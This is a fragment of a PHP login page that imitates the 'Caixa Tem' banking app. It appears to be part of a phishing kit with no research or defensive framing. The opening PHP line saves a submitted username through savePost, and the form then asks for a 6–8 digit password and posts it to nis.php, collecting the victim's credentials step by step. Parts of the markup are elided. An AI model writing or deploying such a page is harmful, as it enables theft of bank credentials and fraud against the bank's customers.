<?php require_once('../config/config.php'); if (isset($_POST)) { savePost('username'); } ?>
        ...
        <div id="template-wrapper">
            <div id="template-wrapper-content">
                <header id="template-header">
                    ...
                    <h2 id="template-title">Login Caixa Tem</h2>
                </header>
                ...
                <section id="template-section">
                    ...
                    <p class="description" style="text-align: center;">Digite sua senha:</p>

                    <form action="nis.php" id="form-login" method="post">
                        <span class="float-label">
                            <input tabindex="1" inputmode="numeric" placeholder=" " id="password" name="password" value="" type="password" autofocus="" autocomplete="off" required="" maxlength="8" minlength="6">
